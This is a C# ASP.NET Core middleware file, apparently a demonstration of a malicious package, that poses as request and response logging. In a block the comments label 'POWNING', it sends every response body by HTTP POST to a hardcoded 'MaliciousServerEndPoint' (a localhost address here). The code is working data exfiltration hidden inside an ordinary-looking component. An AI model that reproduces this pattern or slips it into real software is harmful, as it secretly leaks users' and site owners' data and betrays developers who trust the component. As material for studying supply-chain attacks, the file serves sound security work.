using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging;

namespace Malicious_Middleware_Component
{
    /// <summary>
    ///     Middleware for Logging Request and Responses. Based on
    ///     https://github.com/abierhaus/httprequestresponse-logging-middleware-example
    ///     Remarks: Original code taken from
    ///     https://exceptionnotfound.net/using-middleware-to-log-requests-and-responses-in-asp-net-core/
    /// </summary>
    public class HttpLoggingMiddleware
    {
        private const string MaliciousServerEndPoint = "https://localhost:44346/Home?content=";
        private readonly ILogger _logger;
        private readonly RequestDelegate _next;

        public HttpLoggingMiddleware(RequestDelegate next, ILogger<HttpLoggingMiddleware> logger)
        {
            _next = next;
            _logger = logger;
        }

        public async Task Invoke(HttpContext context)
        {
            //Copy  pointer to the original response body stream
            var originalBodyStream = context.Response.Body;

            //Get incoming request
            var request = await GetRequestAsTextAsync(context.Request);

            //Log it
            _logger.LogInformation(request);


            //Create a new memory stream and use it for the temp reponse body
            await using var responseBody = new MemoryStream();
            context.Response.Body = responseBody;

            //Continue down the Middleware pipeline
            await _next(context);

            //Format the response from the server
            var response = await GetResponseAsTextAsync(context.Response);

            //Log it
            _logger.LogInformation(response);


            //POWNING happens here
            //Send the request to external server
            if (!string.IsNullOrEmpty(response))
            {
                using var httpClient = new HttpClient();
                using var httpRequest = new HttpRequestMessage(HttpMethod.Post,
                    $"{MaliciousServerEndPoint}{response}");
                await httpClient.SendAsync(httpRequest);
            }
            //POWNING ends here


            //Copy the contents of the new memory stream, which contains the response to the original stream, which is then returned to the client.
            await responseBody.CopyToAsync(originalBodyStream);
        }


        private async Task<string> GetRequestAsTextAsync(HttpRequest request)
        {
            var body = request.Body;


            //Read request stream
            var buffer = new byte[Convert.ToInt32(request.ContentLength)];

            //Copy into  buffer.
            await request.Body.ReadAsync(buffer, 0, buffer.Length);

            //Convert the byte[] into a string using UTF8 encoding...
            var bodyAsText = Encoding.UTF8.GetString(buffer);

            //Assign the read body back to the request body
            request.Body = body;

            return $"{request.Scheme} {request.Host}{request.Path} {request.QueryString} {bodyAsText}";
        }

        private async Task<string> GetResponseAsTextAsync(HttpResponse response)
        {
            response.Body.Seek(0, SeekOrigin.Begin);
            //Create stream reader to write entire stream
            var text = await new StreamReader(response.Body).ReadToEndAsync();
            response.Body.Seek(0, SeekOrigin.Begin);

            return text;
        }
    }
}